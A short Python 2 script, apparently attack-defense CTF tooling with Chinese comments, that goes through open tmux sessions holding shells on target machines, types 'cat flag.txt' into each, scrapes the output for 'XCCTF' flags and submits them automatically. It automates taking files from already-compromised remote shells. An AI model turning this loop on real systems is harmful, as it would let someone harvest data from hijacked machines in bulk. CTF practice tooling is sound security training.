#!/usr/bin/env python2
# -*- coding: utf-8 -*- #
# 用于针对已建立连接的目标，进行的批量flag读取、提交
# 使用时修改 （ if "XCCTF"in flag : ） 中的flag标识

from pwn import *
import time
import os
import sys
import requests
import json
from Autopwn import submit_flag

def tmux_list():
    execg = "tmux ls"
    tmux_id_list = subprocess.Popen(execg, shell=True,stdout=subprocess.PIPE)
    tmux_id_list = tmux_id_list.stdout.read()
    tmux_id_list = tmux_id_list.split('\n')
    del tmux_id_list[-1]
    # print tmux_id_list
    tmux_ids = []
    for i in tmux_id_list:
        tmux_ids.append(i[:-54])
        # tmux_ids.append(i[:9])

    return tmux_ids

def get_flag(tmux_id):
    flag = ''
    for i in range(40):
        try:
            tmuxexec = "tmux send-keys -t "+tmux_id+" 'cat flag.txt' "+"enter"
            tmuxexec_2 = "tmux capture-pane -t "+tmux_id
            tmuxexec_3 = "tmux show-buffer"
            os.system(tmuxexec)
            os.system(tmuxexec_2)
            tmuxexec_3 = subprocess.Popen(tmuxexec_3, shell=True,stdout=subprocess.PIPE)
            tmuxexec_3 = tmuxexec_3.stdout.read()
            flag = tmuxexec_3.split('\n')[i*-1]
            if "XCCTF"in flag :
                flag = flag
                break
        except:
            continue
    print flag
    return flag 

# 其他flag格式
# def get_flag(tmux_id):
#     try:
#         tmuxexec = "tmux send-keys -t "+tmux_id+" 'cat flag.txt' "+"enter"
#         tmuxexec_2 = "tmux capture-pane -t "+tmux_id
#         tmuxexec_3 = "tmux show-buffer"
#         os.system(tmuxexec)
#         os.system(tmuxexec_2)
#         tmuxexec_3 = subprocess.Popen(tmuxexec_3, shell=True,stdout=subprocess.PIPE)
#         tmuxexec_3 = tmuxexec_3.stdout.read()
#         flag = tmuxexec_3.split('\n')[-1]
#         if "XCCTF"in flag :
#             flag = flag
#             break
#     except:
#         continue
#     print flag
#     return flag 
    


if __name__=="__main__":

    tmux_ids = tmux_list()
    for i in tmux_ids:
        flag = get_flag(i)
        submit_flag(flag)


